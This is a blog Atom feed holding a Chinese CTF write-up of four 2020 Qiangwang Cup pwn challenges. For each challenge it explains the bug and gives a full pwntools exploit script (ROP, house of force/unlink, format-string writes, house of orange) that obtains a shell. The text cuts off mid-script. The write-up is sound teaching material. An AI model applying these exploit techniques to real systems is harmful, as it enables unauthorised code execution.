<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>风之栖息地</title>
  
  <subtitle>habitat of wind</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hurricane618.me/"/>
  <updated>2020-09-15T11:57:54.737Z</updated>
  <id>https://hurricane618.me/</id>
  
  <author>
    <name>hurricane618</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2020强网杯 强网先锋のpwn</title>
    <link href="https://hurricane618.me/2020/09/15/2020qwb-qwxf-pwn/"/>
    <id>https://hurricane618.me/2020/09/15/2020qwb-qwxf-pwn/</id>
    <published>2020-09-15T11:57:54.000Z</published>
    <updated>2020-09-15T11:57:54.737Z</updated>
    
    <content type="html"><![CDATA[<p>受到摸鱼和各种项目压力之后，终于发出来了，这次是强网杯中强网先锋的4道pwn题，剩下的pwn题还在陆续复现ing，在做了在做了ing</p><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><p>一道神奇的栈溢出题目，有三个功能，写name，写message，输出buf，其中message的数据会被strcopy到buf上。这里的溢出点是在写message的功能上，一开始只能够溢出16字节，覆盖掉栈变量+rbp的值。这里如果只是看反编译的代码是看不出问题的，一定要观察汇编代码，这也是我经常失误的地方不太爱看汇编，555555。</p><p>这里的写message的函数里带着一个局部变量size，而这个变量因为是局部变量，它是受到rbp的值影响的。</p><img src="/2020/09/15/2020qwb-qwxf-pwn/1.png"><p>所以我们的溢出点控制住了rbp，就能够控制这个size局部变量的值，那么我们的输入大小就会增大，可以在栈上布置rop chain。那么这里有哪些合适的地方呢？因为这个程序没有开启aslr，所以我们可以找bss段上的数据，也就是name或者buf，而这里刚好有功能可以写到这两个地方，那么思路就有了。</p><p>通过相关功能向name或者buf写入一个足够大的数，然后通过溢出修改rbp的值，让<code>rbp-0x4</code>其指向我们修改的地方，这样size就被我们控制住了，随后按照一般的ROP操作泄露libc，返回溢出点再次溢出getshell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line">io = process(<span class="string">'./babymessage'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babymessage'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choice: \n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'name: \n'</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">l_mess</span><span class="params">(message)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choice: \n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'message: \n'</span>)</span><br><span class="line">    io.send(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'choice: \n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x6010D0</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400ac3</span></span><br><span class="line">message = <span class="number">0x400995</span></span><br><span class="line">pause()</span><br><span class="line">l_name(p32(<span class="number">0x1000</span>))</span><br><span class="line">l_mess(<span class="string">'a'</span> * <span class="number">8</span> + p64(name + <span class="number">4</span>))</span><br><span class="line">pause()</span><br><span class="line">l_mess(<span class="string">'a'</span> * <span class="number">8</span> + p64(name + <span class="number">4</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(message))</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(<span class="string">'libc address: '</span> + hex(libc_addr))</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">bin_sh = libc_addr + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">pause()</span><br><span class="line">io.sendafter(<span class="string">'message:'</span>, <span class="string">'a'</span> * <span class="number">8</span> + p64(name + <span class="number">4</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="babynote"><a href="#babynote" class="headerlink" title="babynote"></a>babynote</h2><p>这道题的漏洞点在于使用了字符串复制函数strcpy，但是name数组并没有在末尾添加<code>\x00</code>，虽然在一开始对相应区域初始化为0，但是我们如果把name全部填满，那么在字符串复制的时候会认为name与之后的age为同一部分，最终会把后面的age部分一同复制，这样针对dest的复制会溢出。</p><img src="/2020/09/15/2020qwb-qwxf-pwn/2.png"><p>这里针对dest的溢出最多能溢出8个字节，而这里的dest正好size为0x18，这就意味着它占用了下一个chunk的prev_size区域，这溢出的8个字节能够刚好覆盖下一个chunk的size区域。</p><p>我们能控制下一块chunk的size，碰巧的是这下一块chunk刚好是top chunk，同时也能分配小于0x100的chunk，这刚好满足house of force的攻击要求，缺点是向高地址移动距离有限，更多的只能让top chunk向低地址移动。</p><h3 id="house-of-force-unlink-fastbin-attack"><a href="#house-of-force-unlink-fastbin-attack" class="headerlink" title="house of force + unlink/fastbin attack"></a>house of force + unlink/fastbin attack</h3><p>首先，我们布置三个0x100的堆块等待之后能任意分配chunk时构造unlink，随后利用程序提供的重置功能，触发上面的字符串复制的漏洞覆盖top chunk的size区域为-1，换算成补码也就是<code>0xffffffffffffffff</code>。在分配chunk的时候size会被当做无符号数，所以-1会变成最大值。想要控制三块0x100中间的chunk，需要调试计算其中的差值，而这个差值还需要再减0x10，为什么要减0x10，也是因为我们请求的大小会被转换成请求chunk的大小，有一个chunk head的部分需要0x10字节。</p><img src="/2020/09/15/2020qwb-qwxf-pwn/3.png"><p>这里我们的top chunk起始地址为0x1d0f590，我们的目标是控制第二个chunk也就是0x1d0f240，为了控制这个chunk就需要能改变chunk头部，所以我们分配chunk到0x1d0f230，刚好就能写到头部，改变prev_size和size。中间差了0x360再加上0x10一共0x370。通过分配调整top chunk位置之后，我们只需要再次分配0x20大小的chunk就能控制头部。这里申请0x10和0x20都是一个效果，申请0x10会得到0x20的chunk，申请0x20会得到0x30的chunk。</p><p>在能够控制头部之后，伪造prev_size和size，让堆管理认为前面的chunk已经释放，删除中间的块触发unlink前面的chunk，在删除之前需要在前面的chunk中布置需要改变的地址-0x18和地址-0x10，最后造成的效果是目标地址的值变成地址的值-0x18。有了这个我们能改变指针的值，让它指向地址前面，配合程序的修改功能我们能泄露写进的got函数地址，同时能把它修改成其他函数，比如system。这里就是先泄露free函数，获得libc基地址，再写入system地址。最后构造一个chunk，里面的内容为<code>/bin/sh\x00</code>，将其释放即可获得shell。</p><p>这里其实也可以不用unlink攻击，可以使用fastbin attack，我们已经能分配到低地址的chunk，那么也能够修改释放进fastbin的chunk，让其指向free_hook或者malloc_hook的低地址处，分配拿到chunk后直接修改为one_gadget。</p><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h3><p>这是另外一种思路，同样利用strcpy溢出chunk的size区域，不过这里只溢出一个字节，首先申请一个0x18字节的note，再释放它使其进入fastbin中，这样之后修改name时申请的0x18字节会在fastbin中取到这个chunk，达到我们想要溢出的地点。控制chunk的大小为small bin范围，随后释放这个chunk，让它进入unsorted bin中，再次分配原来大小的chunk，在fastbin中没有合适的chunk时会切分unsorted bin中的chunk，切分之后剩下的部分依旧在unsorted bin里面，它的指针会被写进之前chunk的下一块chunk中，这样利用输出功能就能泄露出libc相关地址，得到libc基地址。</p><p>在泄露完成之后，再次分配下一个chunk同样大小的chunk，我们就拿到了两个指向同一chunk的指针，通过这个可以开始uaf攻击，释放其中一个指针，让这个chunk进入fastbin中，再通过另外一个指针修改fastbin指针，指向malloc_hook的低地址处，随后就是分配两次0x70的chunk，第二次就能拿到我们想要的chunk，写入one_gadget覆盖malloc_hook的位置，完成getshell。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>这里给的是house of force方法的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./babynotes'</span>)</span><br><span class="line"><span class="comment">#sh = remote('123.56.170.202',43121)</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./babynotes'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">'Input your name:'</span>,<span class="string">'haivk'</span>)</span><br><span class="line">sh.sendafter(<span class="string">'Input your motto:'</span>,<span class="string">'pwnit'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'Input your age:'</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size)</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input index:'</span>,str(index))</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input note size:'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input index:'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">'Input index:'</span>,str(index))</span><br><span class="line">   sh.sendafter(<span class="string">'Input your note:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset</span><span class="params">()</span>:</span></span><br><span class="line">   sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">pause()</span><br><span class="line">reset()</span><br><span class="line">sh.sendafter(<span class="string">'Input your name:'</span>,<span class="string">'haivk'</span>.ljust(<span class="number">0x18</span>,<span class="string">'a'</span>))</span><br><span class="line">sh.sendafter(<span class="string">'Input your motto:'</span>,<span class="string">'pwnit'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'Input your age:'</span>,<span class="string">'-1'</span>)</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">4</span>,<span class="number">-0x370</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>) <span class="comment"># get chunk1 head</span></span><br><span class="line"><span class="comment">#top chunk上移</span></span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>))</span><br><span class="line">heap0_ptr_addr = <span class="number">0x6020E0</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(heap0_ptr_addr - <span class="number">0x18</span>) + p64(heap0_ptr_addr - <span class="number">0x10</span>))</span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(free_got))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'Note 0: '</span>)</span><br><span class="line">free_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = free_addr - libc.sym[<span class="string">'free'</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(system_addr))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><p>一个典型的格式化字符串漏洞，出现在0x1212函数中。</p><img src="/2020/09/15/2020qwb-qwxf-pwn/4.png"><p>输入<code>Hey Siri!</code>启动siri之后，我们输入开头带有<code>remind me to</code>的字符串，就能进入漏洞点。我们在<code>remind me to</code>之后的输入内容会被带入新的字符串中，printf触发这个格式化字符串的漏洞。</p><p>首先利用漏洞泄露数据，包括栈地址和libc地址，构造格式化字符串<code>%83$p</code>和<code>%44$p</code>可以获取到libc相关的地址和栈地址。剩下就是通过格式化字符串构造任意写，向一些地址写one_gadget。</p><p>构造任意写的方法就是在栈上布置一些需要写的地址，然后通过<code>%yyc%xx$hhn</code>的方法向栈上那个偏移量的地址写值。其中有些地方需要对齐，所以在某地位置要填充数据保证对齐。有了任意地址写，我们的方法就有很多了。</p><h3 id="改写hook"><a href="#改写hook" class="headerlink" title="改写hook"></a>改写hook</h3><p>改写<code>malloc_hook</code>，写其中写入one_gadget，然后输入大量的字符串，这样就会触发malloc，拿到shell。</p><h3 id="改写返回地址"><a href="#改写返回地址" class="headerlink" title="改写返回地址"></a>改写返回地址</h3><p>改写main函数的返回地址，但是没有办法直接返回到main函数，所以再最后一次改写子函数的返回地址，让它的返回地址指向<code>leave ret</code>，这样就会进行栈迁移，使得SP指向main函数的返回地址，也就是one_gadget处。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>注意一点，给的libc和ubuntu自带的libc有一些不同，所以在打远程的时候要用它给的libc。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">"./Siri"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.I:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> args.R:</span><br><span class="line">    p = remote(<span class="string">'123.56.170.202'</span>, <span class="number">12124</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">"./Siri"</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Hey Siri!"</span>)</span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Remind me to %&#123;&#125;$p"</span>.format(<span class="number">0x4d</span>+<span class="number">6</span>))</span><br><span class="line">p.recvuntil(<span class="string">"OK, I'll remind you to "</span>)</span><br><span class="line">base = int(p.recvline().strip(), <span class="number">16</span>) - libc.symbols[<span class="string">'__libc_start_main'</span>] - <span class="number">231</span></span><br><span class="line"></span><br><span class="line">one_gadget = base + <span class="number">0x4f365</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Hey Siri!"</span>)</span><br><span class="line">p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Remind me to %46$p"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"OK, I'll remind you to "</span>)</span><br><span class="line">stack = int(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr, val)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"&gt;&gt;&gt; "</span>, <span class="string">"Hey Siri!"</span>)</span><br><span class="line">    payload = <span class="string">b"Remind me to "</span></span><br><span class="line">    num = val + <span class="number">256</span> - <span class="number">28</span></span><br><span class="line">    payload += <span class="string">'%&#123;&#125;cA'</span>.format(num).encode() <span class="comment"># 6</span></span><br><span class="line">    payload += <span class="string">b'%15$hhn'</span></span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    pause()</span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>, payload)</span><br><span class="line">    p.recvuntil(<span class="string">"OK, I'll remind you to "</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">    num = (one_gadget &gt;&gt; (i*<span class="number">8</span>)) &amp; <span class="number">0xff</span></span><br><span class="line">    write(stack+<span class="number">8</span>+i, num)</span><br><span class="line">pause()</span><br><span class="line">leave_ret = <span class="number">0xC1</span></span><br><span class="line">write(stack<span class="number">-280</span>, leave_ret)</span><br><span class="line"></span><br><span class="line">print(hex(base))</span><br><span class="line">print(hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="just-a-galgame"><a href="#just-a-galgame" class="headerlink" title="just a galgame"></a>just a galgame</h2><p>不得不说，这道题的场景出的特别有意思，很多地方的限制还原了真实的galgame（&gt;_&lt;死宅真恶心~）。</p><p>简单说一下功能，送礼物能malloc(0x68)，最多能分配7次，去看电影能做一个堆溢出修改，刚开始只有一次，但是在执行完表白之后能在获得一次修改机会，表白是申请一个0x1000长度的chunk，查看CG能输出指针内容的信息，最后是退出功能，也能写一个bss段上数据。</p><p>这道题最明显的特征就是没有free的功能，可以联想到<code>house of orange</code>，这种利用技巧能在没有free的情况下把缩小过后的<code>top chunk</code>放进<code>unsorted bin</code>中，这样我们再次分配chunk的时候会从<code>unsorted bin</code>中获取，如果分配之后没有写入啥的，就可以泄露出libc地址。</p><h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h3><p>这种利用技巧需要堆溢出能够覆盖到<code>top chunk</code>的size部分，让它缩小，再申请一个比它size更大的chunk，让这个<code>top chunk</code>进入<code>unsorted bin</code>中，随后堆管理器会扩大堆的大小分配一个新的<code>top chunk</code>。</p><p>在这道题中，我们先申请一个chunk，用做溢出<code>top chunk</code>，随后利用看电影的功能它能溢出到size区域，由于<code>top chunk</code>需要页对齐，所以它的chunk结束处末尾的地址必须为000。由于大chunk的申请大小为0x1000，直接保留最后三位就能满足条件，这里的伪造size为0xd41。最后执行表白功能，申请大chunk，由于<code>top chunk</code>的大小不满足申请大小，也没有其他地方能够满足，最终堆管理器会把<code>top chunk</code>加入<code>unsorted bin</code>中，同时扩大堆的范围获得新的堆空间。</p><p>这时，我们再次申请0x68大小的chunk，根据分配规则会从<code>unsorted bin</code>中进行切分，我们拿到的chunk之后调用输出功能，会把chunk中的数据部分打印出来，这里因为分配之后不会对chunk做初始化或者写入数据操作，能够泄露出libc地址。</p><h3 id="写one-gadget"><a href="#写one-gadget" class="headerlink" title="写one_gadget"></a>写one_gadget</h3><img src="/2020/09/15/2020qwb-qwxf-pwn/5.png"><p>这里要用到另外一个漏洞点了，在看电影功能中会有一个在指针函数中选择指针的过程，而这个下标没有被限制，也就是说我们可以越界写数据，前提是越界的地方是有存放数据的。正好，在指针数组的下方就有一个全局的变量，同时也有功能能写入数据，这样写入我们需要的地址，通过越界访问的方式拿到地址，可以向任意地址写入0x10字节的内容。</p><p>剩下的就是目标选择，这里没有free，所以选择<code>__malloc_hook</code>，向其中写入one_gadget，再次分配即可触发拿到shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># author: hurricane618</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./Just_a_Galgame'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'D'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'R'</span>]:</span><br><span class="line">    io = remote(<span class="string">''</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">'./Just_a_Galgame'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">movie</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'idx &gt;&gt; '</span>, str(index))</span><br><span class="line">    io.sendafter(<span class="string">'movie name &gt;&gt; '</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">confess</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collection</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">(data)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'5'</span>)</span><br><span class="line">    io.sendafter(<span class="string">'QAQ'</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gift()  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">movie(<span class="number">0</span>, p64(<span class="number">0</span>) + p64(<span class="number">0xd41</span>))</span><br><span class="line">pause()</span><br><span class="line">confess()  <span class="comment"># malloc 0x1000</span></span><br><span class="line">pause()</span><br><span class="line">gift()  <span class="comment"># 1</span></span><br><span class="line">collection()  <span class="comment"># leak libc</span></span><br><span class="line"></span><br><span class="line">leak_addr = u64(io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_addr = leak_addr - <span class="number">0x3ec2a0</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">'libc_addr: '</span> + hex(libc_addr))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rcx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  